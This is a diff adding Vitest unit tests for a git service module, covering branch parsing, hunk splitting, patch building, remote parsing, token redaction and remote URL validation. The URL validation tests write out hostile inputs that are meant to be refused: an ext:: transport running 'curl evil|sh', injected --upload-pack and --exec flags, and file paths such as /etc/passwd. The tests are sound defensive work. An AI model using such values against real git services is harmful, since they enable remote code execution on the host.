@@ -1,5 +1,14 @@
 import { describe, expect, it } from "vitest";
-import { parseLog, parseStatus } from "./gitService.js";
+import {
+  isUsableRemoteUrl,
+  redactToken,
+  parseBranches,
+  parseRemotes,
+  parseLog,
+  parseStatus,
+  patchForHunks,
+  splitHunks,
+} from "./gitService.js";
 
 /** Builds a NUL-terminated porcelain payload the way git actually emits it. */
 function porcelain(...entries: string[]): string {
@@ -175,5 +184,253 @@ describe("parseLog", () => {
 
   it("returns nothing for empty output", () => {
     expect(parseLog("")).toEqual([]);
+  });
+});
+
+describe("parseBranches", () => {
+  /** Builds what `git branch --format=%(refname:short)%00%(HEAD)` emits. */
+  function listing(...entries: [string, boolean][]): string {
+    return entries.map(([name, current]) => `${name}\0${current ? "*" : " "}`).join("\n");
+  }
+
+  it("reads names and marks the current branch", () => {
+    const branches = parseBranches(listing(["main", true], ["feature", false]));
+    expect(branches).toEqual([
+      { name: "main", current: true },
+      { name: "feature", current: false },
+    ]);
+  });
+
+  it("returns nothing for an empty listing", () => {
+    expect(parseBranches("")).toEqual([]);
+  });
+
+  it("keeps a name containing a space", () => {
+    // git allows it, so splitting on whitespace would corrupt the name.
+    const branches = parseBranches(listing(["feat/two words", false]));
+    expect(branches[0]?.name).toBe("feat/two words");
+  });
+
+  it("keeps slashes and dots in a name", () => {
+    const branches = parseBranches(listing(["release/1.2.x", false]));
+    expect(branches[0]?.name).toBe("release/1.2.x");
+  });
+
+  it("skips a detached HEAD, which is a state rather than a branch", () => {
+    const branches = parseBranches(listing(["(HEAD detached at abc1234)", true]));
+    expect(branches).toEqual([]);
+  });
+
+  it("ignores blank lines", () => {
+    expect(parseBranches("\n\n")).toEqual([]);
+  });
+
+  it("marks nothing current when none is", () => {
+    const branches = parseBranches(listing(["main", false]));
+    expect(branches[0]?.current).toBe(false);
+  });
+});
+
+const TWO_HUNKS = `diff --git a/f.txt b/f.txt
+index 8afd661..60fd8f7 100644
+--- a/f.txt
++++ b/f.txt
+@@ -1,4 +1,4 @@
+-l1
++CHANGED1
+ l2
+ l3
+ l4
+@@ -12,4 +12,4 @@ l11
+ l12
+ l13
+ l14
+-l15
++CHANGED15
+`;
+
+describe("splitHunks", () => {
+  it("separates the header from the hunks", () => {
+    const { header, hunks } = splitHunks(TWO_HUNKS);
+
+    expect(header).toContain("diff --git a/f.txt b/f.txt");
+    expect(header).toContain("+++ b/f.txt");
+    expect(header).not.toContain("@@");
+    expect(hunks).toHaveLength(2);
+  });
+
+  it("starts each hunk at its own @@ line", () => {
+    const { hunks } = splitHunks(TWO_HUNKS);
+
+    expect(hunks[0]?.startsWith("@@ -1,4 +1,4 @@")).toBe(true);
+    expect(hunks[1]?.startsWith("@@ -12,4 +12,4 @@")).toBe(true);
+  });
+
+  it("keeps a hunk's bytes exactly, so the patch still applies", () => {
+    const { hunks } = splitHunks(TWO_HUNKS);
+
+    // Context lines keep their leading space; nothing is trimmed.
+    expect(hunks[0]).toContain("\n l2\n");
+    expect(hunks[0]).toContain("-l1\n");
+    expect(hunks[0]).toContain("+CHANGED1\n");
+  });
+
+  it("finds no hunks in a patch that has none", () => {
+    expect(splitHunks("").hunks).toEqual([]);
+    expect(splitHunks("Binary files differ\n").hunks).toEqual([]);
+  });
+
+  it("does not mistake a removed line beginning @@ for a hunk header", () => {
+    // A hunk header is matched at the start of a line; a removed line starts
+    // with the marker, so "-@@" is content.
+    const { hunks } = splitHunks(`--- a/f
++++ b/f
+@@ -1 +1 @@
+-@@ not a header
++ok
+`);
+    expect(hunks).toHaveLength(1);
+    expect(hunks[0]).toContain("-@@ not a header");
+  });
+});
+
+describe("patchForHunks", () => {
+  it("keeps the header in front of the chosen hunk", () => {
+    const patch = patchForHunks(TWO_HUNKS, [0]);
+
+    expect(patch).toContain("--- a/f.txt");
+    expect(patch).toContain("+CHANGED1");
+    expect(patch).not.toContain("CHANGED15");
+  });
+
+  it("takes the second hunk alone", () => {
+    const patch = patchForHunks(TWO_HUNKS, [1]);
+
+    expect(patch).toContain("+CHANGED15");
+    expect(patch).not.toContain("+CHANGED1\n");
+  });
+
+  it("takes several, in file order whatever order they were asked for", () => {
+    const patch = patchForHunks(TWO_HUNKS, [1, 0]);
+
+    expect(patch.indexOf("CHANGED1")).toBeLessThan(patch.indexOf("CHANGED15"));
+  });
+
+  it("ignores a repeated index rather than duplicating the hunk", () => {
+    const patch = patchForHunks(TWO_HUNKS, [0, 0, 0]);
+
+    expect(patch.split("+CHANGED1\n")).toHaveLength(2);
+  });
+
+  it("ignores an index past the end", () => {
+    expect(patchForHunks(TWO_HUNKS, [9])).toBe("");
+    expect(patchForHunks(TWO_HUNKS, [0, 9])).toContain("+CHANGED1");
+  });
+
+  it("returns nothing when asked for nothing", () => {
+    expect(patchForHunks(TWO_HUNKS, [])).toBe("");
+  });
+
+  it("returns nothing for a patch with no hunks", () => {
+    expect(patchForHunks("", [0])).toBe("");
+  });
+});
+
+describe("parseRemotes", () => {
+  const listing = [
+    "origin\thttps://github.com/example/repo.git (fetch)",
+    "origin\thttps://github.com/example/repo.git (push)",
+    "upstream\thttps://github.com/other/repo.git (fetch)",
+    "upstream\thttps://github.com/other/repo.git (push)",
+  ].join("\n");
+
+  it("lists each remote once, not once per direction", () => {
+    expect(parseRemotes(listing)).toEqual([
+      { name: "origin", url: "https://github.com/example/repo.git" },
+      { name: "upstream", url: "https://github.com/other/repo.git" },
+    ]);
+  });
+
+  it("returns nothing when there are no remotes", () => {
+    expect(parseRemotes("")).toEqual([]);
+  });
+
+  it("ignores a malformed line", () => {
+    expect(parseRemotes("nonsense\n")).toEqual([]);
+  });
+
+  it("keeps an ssh-style URL as written", () => {
+    expect(parseRemotes("origin\tgit@github.com:a/b.git (fetch)")).toEqual([
+      { name: "origin", url: "git@github.com:a/b.git" },
+    ]);
+  });
+});
+
+describe("isUsableRemoteUrl", () => {
+  it.each([
+    "https://github.com/a/b.git",
+    "http://host/repo.git",
+    "ssh://git@github.com/a/b.git",
+    "git://host/repo.git",
+    "git@github.com:a/b.git",
+  ])("accepts %s", (url) => {
+    expect(isUsableRemoteUrl(url)).toBe(true);
+  });
+
+  it("refuses git's ext:: transport, which runs the rest as a command", () => {
+    // `ext::sh -c ...` is remote code execution the moment anything fetches.
+    expect(isUsableRemoteUrl('ext::sh -c "curl evil|sh"')).toBe(false);
+    expect(isUsableRemoteUrl("ext::sh")).toBe(false);
+  });
+
+  it("refuses file://, which would reach the server rather than the network", () => {
+    expect(isUsableRemoteUrl("file:///etc")).toBe(false);
+  });
+
+  it("refuses anything that would be read as a flag", () => {
+    expect(isUsableRemoteUrl("--upload-pack=evil")).toBe(false);
+    expect(isUsableRemoteUrl("-u")).toBe(false);
+  });
+
+  it("refuses a bare path and an empty string", () => {
+    expect(isUsableRemoteUrl("/etc/passwd")).toBe(false);
+    expect(isUsableRemoteUrl("../../etc")).toBe(false);
+    expect(isUsableRemoteUrl("")).toBe(false);
+  });
+
+  it("refuses a URL with whitespace, which could carry a second argument", () => {
+    expect(isUsableRemoteUrl("https://host/repo --exec=evil")).toBe(false);
+  });
+});
+
+describe("redactToken", () => {
+  it("replaces the value wherever it appears", () => {
+    expect(redactToken("remote: rejected for abc123", "abc123")).toBe(
+      "remote: rejected for ***",
+    );
+  });
+
+  it("replaces every occurrence, not just the first", () => {
+    expect(redactToken("abc123 and again abc123", "abc123")).toBe(
+      "*** and again ***",
+    );
+  });
+
+  it("catches one embedded in a URL", () => {
+    // The shape it would take if it ever reached a remote URL.
+    expect(
+      redactToken("https://token:abc123@github.com/a/b.git", "abc123"),
+    ).toBe("https://token:***@github.com/a/b.git");
+  });
+
+  it("leaves text alone when there is nothing to redact", () => {
+    expect(redactToken("nothing secret here", "abc123")).toBe(
+      "nothing secret here",
+    );
+  });
+
+  it("does nothing for an empty token rather than mangling the text", () => {
+    // Splitting on "" would otherwise insert the mask between every character.
+    expect(redactToken("some output", "")).toBe("some output");
   });
 });
